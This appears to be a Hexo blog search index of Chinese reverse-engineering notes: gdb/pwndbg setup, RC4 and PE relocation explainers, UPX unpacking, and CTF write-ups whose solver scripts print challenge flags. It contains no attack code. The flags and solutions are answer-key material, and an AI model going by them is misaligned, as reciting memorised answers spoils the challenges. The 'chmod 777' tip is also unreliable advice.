d + 794 * e + 237 * f + 762 * g + 676 * h + 595 * i + 623 * j + 328 * k + 198 * l == 523895)s.add(681 * a + 513 * b + 789 * c + 237 * d + 960 * e + 773 * f + 621 * g + 608 * h + 335 * i + 383 * j + 395 * k + 812 * l == 655241)s.add(503 * a + 702 * b + 628 * c + 150 * d + 672 * e + 324 * f + 795 * g + 892 * h + 738 * i + 610 * j + 150 * k + 862 * l == 643363)s.add(16 * a + 590 * b + 294 * c + 408 * d + 757 * e + 272 * f + 101 * g + 4 * h + 174 * i + 801 * j + 550 * k + 163 * l == 313208)s.add(956 * a + 720 * b + 177 * c + 741 * d + 579 * e + 5 * f + 863 * g + 135 * h + 571 * i + 451 * j + 935 * k + 762 * l == 618358)s.add(227 * a + 600 * b + 185 * c + 874 * d + 579 * e + 518 * f + 356 * g + 185 * h + 267 * i + 370 * j + 35 * k + 153 * l == 389914)s.add(173 * a + 641 * b + 83 * c + 826 * d + 218 * e + 845 * f + 282 * g + 893 * h + 578 * i + 29 * j + 636 * k + 746 * l == 555914)s.add(61 * a + 999 * b + 324 * c + 493 * d + 387 * e + 470 * f + 643 * g + 961 * h + 605 * i + 926 * j + 85 * k + 406 * l == 554902)s.add(857 * a + 823 * b + 648 * c + 45 * d + 949 * e + 230 * f + 763 * g + 810 * h + 603 * i + 707 * j + 809 * k + 88 * l == 628055)s.add(797 * a + 159 * b + 229 * c + 642 * d + 999 * e + 534 * f + 624 * g + 442 * h + 500 * i + 938 * j + 851 * k + 84 * l == 568919)if s.check() == sat: result = s.model() print(result)else: print(&quot;[!] NoReply&quot;)","categories":[{"name":"逆向学习","slug":"逆向学习","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/"},{"name":"工具相关","slug":"逆向学习/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"gdb与pwntools简单使用","slug":"gdb与pwntools简单使用","date":"2024-01-23T03:35:42.000Z","updated":"2024-01-25T13:06:03.178Z","comments":true,"path":"2024/01/23/gdb与pwntools简单使用/","link":"","permalink":"http://example.com/2024/01/23/gdb%E4%B8%8Epwntools%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"gdb与pwntools简单使用linux下安装gdb12apt-get updateapt-get install gdb 安装时需要选择 y 确认继续安装 pwntools123git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 可能遇到的问题1.Permission denied权限不够，使用以下命令 12sudo chmod 777 文件名 #普通用户下chmod 777 文件名 #管理员用户下 2.git clone超时&#x2F;太慢换国内的源 12sudo vim /etc/apt/sources.list #普通用户下vim /etc/apt/sources.list #管理员用户下 按 i 进入编辑模式，将官方源注释掉，替换为下面任意一个国内源 123456789101112131415中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 如图： 按esc，输入:wq保存退出 3.git报错如果git报错：The TLS connection was non-properly terminated. 或 fatal: unable to access ‘https://github.com/pwndbg/pwndbg.git/‘: Failed to connect to github.com port 443 after 21045 ms: Couldn’t connect to server 一是可能网速过慢了，二是git在拉取或者提交项目时，中间会有git的http和https代理，但是我们本地环境本身就有SSL协议了，所以取消git的https代理即可，不行再取消http的代理，然后在windows用魔法上网就可以了 1234//取消http代理git config --global --unset http.proxy//取消https代理 git config --global --unset https.proxy 4.连不上pypi.org.&#x2F;setup.sh成功运行，但是中途有报错，显示请求连接pypi.org失败 解决办法：将清华大学开源软件镜像站的PyPI 镜像设为默认 需升级 pip 到最新的版本 (&gt;&#x3D;10.0.0) 后进行配置 12python -m pip install --upgrade pippip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 简单使用启动使用命令 1gdb 文件名 #文件在当前目录下 基本的命令1234567b main #在gdb分析得到的main处下断点b *0x12345678 #在地址0x12345678处下断点r #运行c #运行到下一个断点x/3xh 0x12345678 #以16进制形式，以双字节为一单位， #查看0x12345678内存地址处，与后两个单位共三个单位的内容（x：16进制 h:双字节）q #退出gdb","categories":[{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"ctfshow-reverse-re2","slug":"ctfshow-reverse-re2","date":"2024-01-21T08:53:23.000Z","updated":"2024-03-11T00:22:17.442Z","comments":true,"path":"2024/01/21/ctfshow-reverse-re2/","link":"","permalink":"http://example.com/2024/01/21/ctfshow-reverse-re2/","excerpt":"","text":"ctfshow-reverse-re2题目包含一个可执行文件和一个文本文件 ida下可以看到enflag.txt里的内容被提取给enflag（我自己重命名成enflag了，后面的函数名、参数名我都进行过重命名） 获取key进入第51行的encode函数，可以看到将Str与0x1F异或得到Str1，在main函数里就是用户输入的key异或0x1F得到Str1，而Str1在第11行已知，可以得到key 四个关键函数返回main函数进入第52行函数 这里有四个关键函数，分别来看一下 第一个len是key的长度，可以知道key是小于265的，所以可以得到数组T的数据是key的重复填充 第二个数组S的数据是从0~256的整数 第三个通过 数组T 将 数组S 打乱，i 从 0~256，保证 数组S 每一位都被替换过 第四个注意第12行，可以看到 i 是Stream的每一位，然后通过 v7 &#x3D; (v7 + 1) % 256 和 v6 &#x3D; (v6 + S[v7]) % 256 计算出 S表中需要进行替换的两位，然后将这两位的数值相加然后对256取模，得到的值再作为数组S的下标，取该下标内的值与 i 进行异或，通过fputc将每次异或得到的值连接起来（四个函数执行完毕后的close(enflag)确保了enflag是一个完整的字符串） 解密分析四个关键函数可以看出来这是RC4加密算法，将明文作为密文再进行一次这个算法就可以得到flag 而明文来自enflag.txt，直接打开文本文件时一串乱码，所以需要用010editor打开查看数据 编写脚本得到flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#加密or解密enflag = [0xc3,0x82,0xa3,0x25,0xf6,0x4c,0x36,0x3b,0x59,0xcc,0xc4,0xe9,0xf1,0xb5,0x32,0x18,0xb1,0x96,0xae,0xbf,0x08,0x35]len_enflag = len(enflag)S = [0]*256T = [0]*256key=&#x27;[Warnning]Access_Unauthorized&#x27;stream = [0] * 256len = len(key)flag=[0]*len_enflag#初始化S、T表for i in range(256): S[i] = ifor i in range(256): T[i] = ord(key[i%len])#打乱S表j = 0for i in range(256): j = (S[i] + T[i] + j) % 256 temp1 = S[i] S[i] = S[j] S[j]= temp1#生成密钥流(这一部分需要依照实际的生成代码)j = 0k = 0for i in range(256): j = (j + 1) % 256 k = (k + S[j]) % 256 temp2 = S[j] S[j] = S[k] S[k]= temp2 stream[i] = S[(S[j] + S[k]) % 256]#加密or解密for i in range(len_enflag): flag[i] = enflag[i] ^ stream[i] print(chr(flag[i]),end=&#x27;&#x27;)print(flag)#flag&#123;RC4&amp;-&gt;ENc0d3F1le&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"RC4加解密","slug":"RC4 加解密","date":"2024-01-21T08:28:14.000Z","updated":"2024-01-27T09:31:11.122Z","comments":true,"path":"2024/01/21/RC4 加解密/","link":"","permalink":"http://example.com/2024/01/21/RC4%20%E5%8A%A0%E8%A7%A3%E5%AF%86/","excerpt":"","text":"RC4加解密RC4是一种对称加密，加密过程与解密过程一样 主要的流程都是 创建大小为256、从0~1的Sbox表 创建大小为256、重复填充密钥key的Tbox表 利用Tbox表打乱Sbox表 根据具体代码生成大小为256的密钥流stream 将密文&#x2F;明文的每一位与密钥流的每一位分别进行异或，得到明文&#x2F;密文 1234567891011121314151617181920212223242526272829303132333435363738394041424344#加密or解密enflag = [0xc3,0x82,0xa3,0x25,0xf6,0x4c,0x36,0x3b,0x59,0xcc,0xc4,0xe9,0xf1,0xb5,0x32,0x18,0xb1,0x96,0xae,0xbf,0x08,0x35]len_enflag = len(enflag)S = [0]*256T = [0]*256key=&#x27;[Warnning]Access_Unauthorized&#x27;stream = [0] * 256len = len(key)flag=[0]*len_enflag#初始化S、T表for i in range(256): S[i] = ifor i in range(256): T[i] = ord(key[i%len])#打乱S表j = 0for i in range(256): j = (S[i] + T[i] + j) % 256 temp1 = S[i] S[i] = S[j] S[j]= temp1#生成密钥流(这一部分需要依照实际的生成代码)j = 0k = 0for i in range(256): j = (j + 1) % 256 k = (k + S[j]) % 256 temp2 = S[j] S[j] = S[k] S[k]= temp2 stream[i] = S[(S[j] + S[k]) % 256]#加密or解密for i in range(len_enflag): flag[i] = enflag[i] ^ stream[i] print(chr(flag[i]),end=&#x27;&#x27;)print(flag)","categories":[{"name":"算法相关","slug":"算法相关","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"PE文件格式-PE重定位操作原理","slug":"PE文件格式-16.3PE重定位操作原理","date":"2023-11-25T15:13:44.000Z","updated":"2024-02-24T07:27:44.977Z","comments":true,"path":"2023/11/25/PE文件格式-16.3PE重定位操作原理/","link":"","permalink":"http://example.com/2023/11/25/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-16.3PE%E9%87%8D%E5%AE%9A%E4%BD%8D%E6%93%8D%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"16.3 PE重定位操作原理Windows的PE装载器进行PE重定位处理时，基本的操作原理很简单 PE重定位的基本操作原理 在应用程序中查找硬编码的地址位置 读取值后，减去ImageBase（VA-&gt;RVA） 加上实际加载地址（RVA-&gt;VA） 其中最关键的是查找硬编码地址的位置。查找过程中会用到PE文件内部的Relocation Table（重定位表），它是记录硬编码地址偏移（位置）的列表（重定位表是在PE文件构建过程（编译&#x2F;链接）中提供的）。通过重定位表查找，其实就是根据PE头的“基址重定位表”项进行的查找 16.3.1 基址重定位表基址重定位表地址位于PE头的 DataDirectory 数组的第六个元素（数组索引为5）： IMAGE_NT_HEADERS \\ IMAGE_OPTIONAL_HEADER \\ IMAGE_DATA_DIRECTORY[5] 再PEView中查看notepad.exe的基址重定位表地址 可以看到地址是 RVA 0002F000，用PEView查看这个地址 16.3.2 IMAGE_BASE_RELOCATION结构体IMAGE_BASE_RELOCATION结构体的定义如下： IMAGE_BASE_RELOCATION结构体的第一个成员为VitualAddress，它是一个基准地址（BaseAddress），实际是RVA值。第二个成员为SizeOfBlock，指重定位块的大小。最后一项TypeOffset数组不是结构体成员，而是以注释形式存在的，表示在该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移 16.3.3 基址重定位表的分析方法先来看看基址重定位表部分内容 由IMAGE_BASE_RELOCATION结构体可知，VitualAddress成员的值为1000，SizeOfBlock的值为150，说明TypeOffset数组的基准地址就是RVA 1000，块的总大小是150 块的末端显示为0，TypeOffset值为2个字节大小（也就是16位），是由4位的Type和12位的Offset合成的，比如，TypeOffset的值为3420，那么 类型（4位） 偏移（12位） 3 420 高4位用作Type，PE文件中常见的值为3（IMAGE_REL_BASED_HIGHLOW），64位的PE+文件中常见的值为A（IMAGE_REL_BASED_DIR64） 在恶意代码中正常修改文件代码后，有时要修改指向相应区域的重定位表（为了略去PE装载器的重定位过程，常常把Type值改为0（IMAGE_REL_BASED_ABSOLUTE）） TypeOffset的低12位是真正的位移，该位移值基于Vitual Address（VA）的偏移，所以程序中硬编码地址的偏移使用下面等式换算： 1VirtualSize（1000） + Offset（420） = RVA（1420） 下面看一下 RVA 1420 处是否实际存在要执行PE重定位操作的硬编码地址 图中notepad.exe被加载到AF0000地址处，所以 RVA 1420 即为 VA AF1420，该地址处存储着 IAT地址（VA AF10C4），并且该值经过PE重定位而发生了变化 TypeOffset项中指向位移的低12位拥有的最大地址值为1000。为了表示更大的地址，需要添加一个与其对应的块，由于这些块以数组的形式罗列，故称为重定位表 16.3.4 PE重定位是如何进行的#1.查找程序中硬编码地址的位置程序中使用的硬编码地址的偏移，可以通过基址重定位表查找得到，这里我们用上面求得的 RVA 1420 来继续。用 PEView 查看 RVA 1420 地址中的内容 可以看到， RVA 1420中存在着程序的硬编码地址值010010C4（这个减去基址1000000就是10C4，10C4加上实际加载地址AF0000就是之前看到的AF10C4） #2.读取值后，减去ImageBase（VA-&gt;RVA）​ 010010C4 - 01000000 &#x3D; 10C4 #3.加上实际加载地址（RVA-&gt;VA）​ 10C4 + AF0000 &#x3D; AF10C4 对于程序内部硬编码的地址（比如010010C4），PE装载器都做以上处理，根据实际加载地址的内存地址修正后，将得到的值（AF10C4）覆盖到同一位置。对一个IMAGE_BASE_RELOCATION结构体的所有TypeOffset都重复上述过程。若TypeOffset的值为0，则表明一个IMAGE_BASE_RELOCATION结构体装载结束 对重定位表中出现的所有IMAGE_BASE_RELOCATION结构体都重复上述处理后，就完成了对进程内存区域相应的硬编码地址的PE重定位。重定位表以NULL结构体结束（即IMAGE_BASE_RELOCATION结构体的所有成员值为NULL）","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"PE文件格式","slug":"逆向工程核心原理/PE文件格式","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"}],"tags":[]},{"title":"PE文件格式-PE重定位","slug":"PE文件格式-16.1&2PE重定位","date":"2023-11-25T13:43:01.000Z","updated":"2024-02-24T07:27:38.849Z","comments":true,"path":"2023/11/25/PE文件格式-16.1&2PE重定位/","link":"","permalink":"http://example.com/2023/11/25/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-16.1&2PE%E9%87%8D%E5%AE%9A%E4%BD%8D/","excerpt":"","text":"16.1 PE重定位向进程的虚拟内存中加载PE文件时，文件会被加载到PE头的ImageBase所指的地址处。若加载的是DLL（SYS）文件，且在ImageBase位置处已经加载了其它DLL（SYS）文件，那么PE装载器就会将其加载到其它未被占用的空间。这就涉及PE文件重定位的问题，PE重定位是指PE文件无法加载到ImageBase所指位置，而是被加载到其它地址时发生的一系列的处理行为。 使用SDK（Software Development Kit，软件开发工具包）或 Visual C++ 创建 PE 文件时，EXE 默认的 ImageBase 为 00400000，DLL 默认的 ImageBase 为10000000。此外，使用 DDK（Driver Development Kit，驱动开发工具包）创建的 SYS 文件默认的 ImageBase 为 10000 16.1.1 DLL&#x2F;SYS下图中可以看到，A.DLL 被加载到 TEXT.EXE 进程的 10000000 地址处。此后，B.DLL 试图加载到相同地址（10000000）时，PE装载器将 B.DLL 加载到另一个尚未被占用的地址（3C000000）处 16.1.2 EXE创建好进程后，EXE 文件会先首先加载到内存，所以在 EXE 中无须考虑重定位的问题。但是 Windows Vista 之后的版本引入了 ASLR 安全机制，每次运行 EXE 文件都会被加载到随机地址，这样大大增强了系统安全性 ASLR 机制也适用于 DLL&#x2F;SYS 文件，对于各 OS 的主要系统 DLL，微软会根据不同版本分别赋予不同的 ImageBase 地址。同一系统的 kernel32.dll、user32.dll 等会被加载到自身固有的 ImageBase，所以，系统的 DLL实际不会发生重定位问题 Windows Vista&#x2F;7 的系统 DLL 虽然也拥有自身固有的 ImageBase，但是 ASLR 机制使每次启动时加载的地址都不尽相同。关于 ASLR 的详细内容请参考第 41 章 16.2 PE重定位时执行的操作下面以书上的例子来看看 PE 重定位时都发生了什么（Windows7的notepad.exe） 可以看到notepad.exe的ImageBase为10000000 接下来用OllyDbg运行notepad.exe程序 可以看到，在 ASLR 机制作用下，程序被加载到 0028000 处。从图中指令可以看到，方框中进程的内存地址以硬编码形式存在。地址2810FC、281100是.text节区的IAT区域，地址28C0A4是.data节区的全局变量。每当在OllyDbg中重启notepad.exe，地址值就随加载地址的不同而改变。像这样，使硬编码在程序中的内存地址随当前加载地址变化而改变的处理过程就是PE重定位 无法加载到 ImageBase 地址时，若未进行过 PE重定位处理，应用程序就不能正常运行（因发生“内存地址引用错误”，程序异常终止）","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"PE文件格式","slug":"逆向工程核心原理/PE文件格式","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"}],"tags":[]},{"title":"PE文件格式-调试notepad_upx.exe","slug":"PE文件格式-15调试notepad_upx.exe","date":"2023-11-23T14:45:11.000Z","updated":"2024-02-24T07:27:34.809Z","comments":true,"path":"2023/11/23/PE文件格式-15调试notepad_upx.exe/","link":"","permalink":"http://example.com/2023/11/23/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-15%E8%B0%83%E8%AF%95notepad_upx.exe/","excerpt":"","text":"15.1 notepad.exe的EP代码先回忆一下什么是EP EP（EntryPoint 入口点）- EP 是 Windows 可执行文件（EXE、DLL、SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU 现在我们先来看一下原notepad.exe程序的EP代码（x64dbg会帮你找好） 往下翻可以看到有在调用GetModuleHandlew()API，获取notepad.exe程序的ImageBase。然后在后面比较MZ和PE签名（5A 4D和45 50） 15.2 notepad_upx.exe的EP代码下面是压缩文件的UPX EP代码 来看一下代码的开始部分，首先是把寄存器的值保存到栈，然后把第二个节区的起始地址与第一个节区的起始地址设置到rsi与rdi寄存器。upx文件第一个节区仅存在于内存，该处即是解压缩后保存源文件代码的地方 我们的目标是跟踪全部UPX EP代码，并最终找到原notepad的EP代码 15.3 跟踪 UPX 文件这里仅看结论，了解一下upx的解压缩过程，具体跟踪操作与代码分析请看《逆向工程核心原理》第15章 第129页起整个解压缩过程由无数循环组成，下面是解压缩过程中遇到的几个有意思的循环 循环#1：写入内容至第一个节区（UPX0，仅存在于内存中的节区，其实内容全部为NULL），遇到这样的循环直接跳出即可 循环#2：解压缩循环，从第二个节区（UPX1）中依次读取值，经过适当的运算解压缩后，写入第一个节区（UPX0） 循环#3：恢复源代码的CALL&#x2F;JMP指令（操作码：E8&#x2F;E9）的destination地址 循环#4：恢复原IAT（特点：反复调用GetProcAddress()函数） 下面来重点聊聊是怎么恢复原IAT的。我们要知道，UPX压缩原文件时，它会分析其IAT，提取出程序中调用的API名称列表，形成API名称字符串。解压缩时，就用这些API名称字符串调用GetProcAddress()函数，获取API的起始地址，然后把API地址输入原文件的IAT区域。该过程会反复进行至API名称字符串结束，最终恢复原文件的IAP有趣的是，在全部解压缩完成后，会有pop各寄存器的命令，其实这是对应了UPX代码最开始的 push各寄存器的命令，用来把当前寄存器恢复原状最终，会跳转到OEP处 15.4 快速查找UPX OEP的方法 用PUSHAD指令代表将8个通用寄存器（EAX～EDI&#x2F;RAX～RDI）的值保存到栈用POPAD指令代表把PUSHAD命令存储在栈的值再次恢复到各个寄存器 15.4.1 在 POPAD指令 后的JMP指令处设置断点UPX寄存器的特征之一是，其EP被包含在 PUSHAD&#x2F;POPAD 指令之间，并且，跳转到OEP代码的JMP指令紧接着出现在POPAD指令之后。只要在JMP指令处设置好断点，运行后就能直接找到OEP 15.4.2 在栈中设置硬件断点该方法也利用UPX的PUSHAD&#x2F;POPAD指令的特点实现： 执行PUSHAD命令后，栈地址处的值为最后一个寄存器的值（EAX～EDI的值依次被存储到栈） 从Dump窗口进入栈地址，在栈地址处设置硬件断点 硬件断点是CPU支持的断点，与普通断点不同的是，设置断点的指令执行完成后才暂停调试。在这种状态下运行，程序就会边解压边执行代码，在执行POPAD的瞬间访问设置有硬件断点的地址，然后暂停调试。其下方即是跳转到OEP的JMP指令 来看看实操 设好后F9就会运行到我们想要的pop处，下面就是我们要找的 jmp 左边是Notepad.exe，右边是notepad_upx.exe，可以看到Notepad.exe的EP和notepad_upx.exe刚刚得到的EP代码是一样的（地址其实也是一样的，看的不一样是因为起始位置不同，而偏移是相同的）","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"PE文件格式","slug":"逆向工程核心原理/PE文件格式","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"}],"tags":[]},{"title":"网鼎杯2020青龙组-singal","slug":"[网鼎杯2020青龙组]singal","date":"2023-11-15T03:15:23.000Z","updated":"2024-01-21T10:16:50.777Z","comments":true,"path":"2023/11/15/[网鼎杯2020青龙组]singal/","link":"","permalink":"http://example.com/2023/11/15/[%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84]singal/","excerpt":"","text":"[网鼎杯2020青龙组]singal 这道题是道虚拟机题，有静态和动调两种方式解决 方法一：静态分析说是静态分析，其实就是把他给的虚拟机代码和数据库复制粘贴来用，图二中的就是虚拟机的运行代码，我们要的数据库就是 v4，在图一第 6 行，把 unk_403040 处的值赋给了 v4，这样我们得到了 v4 注意提取的时候它默认给的是unsigned char类型的，这个很重要、 接下来就是先观察一下虚拟机的代码是怎么运行的 这里我们注意到 result 是Str的长度，需要为15才行，所以flag的长度是15 因为在case 10和case 7中间运行了多少步我们是不好求的，但是case 7中的a1[v9 + 1]我们是必须要知道的，这样才知道Str[v7 + 100]是多少，逆向才能继续。然后如果我们知道了a1[v9 + 1]都是些什么，接下来要怎么反过来求最初的flag我们也要思考，既然是用虚拟机的代码和它给的固定数据库实现运行得到的a1[v9 + 1]，那么我们也可以将虚拟机的代码完全反过来，数据库的数据也全部反过来，再结合a1[v9 + 1]就可以运行新的代码得到flag。要实现这个就需要记录v9是怎么变化的，因为switch里的是a1[v9]，那么v9是怎么个取值过程我们必须知道， 知道了要求什么了之后，我们就可以把代码复制粘贴好后稍作修改就可以用了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char vmcode[] = //数据库&#123; 0x0A, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x33, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xA7, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xF1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x84, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0xC1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 &#125;;int* a = (int*)vmcode;int __cdecl vm_operad(int* code, int len114)&#123; char order[114] = &#123;&#125;; //用来记录v9的值的变化过程 char flag[200]; //记录我们要的a1[v9 + 1] char tmp; int m = 0; int v9 = 0; int v7 = 0; int v8 = 0; int v6 = 0; int v5 = 0; while (1) &#123; if (v9 &gt;= len114) break; switch (code[v9]) &#123; case 1: flag[v6 + 100] = tmp; ++v9; ++v6; ++v8; break; case 2: tmp = code[v9 + 1] + flag[v8]; v9 += 2; break; case 3: tmp = flag[v8] - code[v9 + 1]; v9 += 2; break; case 4: tmp = code[v9 + 1] ^ flag[v8]; v9 += 2; break; case 5: tmp = code[v9 + 1] * flag[v8]; v9 += 2; break; case 6: ++v9; break; case 7: flag[v7+100] = code[v9 + 1]; //把判断改为直接赋值，因为我们要知道值是什么 printf(&quot;%#x,&quot;, flag[v7+100]); //以16进制的形式输出出来 ++v7; v9 += 2; break; case 8: flag[v5] = tmp; ++v9; ++v5; break; case 10: printf(&quot;请输入flag：&quot;); //手动输入数据 scanf(&quot;%s&quot;,flag); ++v9; break; case 11: tmp = flag[v8] - 1; ++v9; break; case 12: tmp = flag[v8] + 1; ++v9; break; &#125; order[m++] = v9; //每运行一步就记录一次v9的值 &#125; printf(&quot;\\nv9的值依次是：\\n&quot;); for (int i = 0; i &lt; strlen(order); i++) &#123; printf(&quot;%d,&quot;,order[i]); &#125; return 0;&#125;int main()&#123; vm_operad(a, 114); return 0;&#125; 可以看到除了case 7和case 10其它的都是不变的，直接照搬过来 符串就行 这样我们就得到了我们想要的，再把虚拟机的代码反过来修改一下运行就可以得到flag了。需要注意的是，v9我们已经得到了，所以v9怎么赋值是我们来决定的，在修改虚拟机代码的时候就不需要v9++什么的代码了，直接删掉就可以，但是其他的都需要保留。 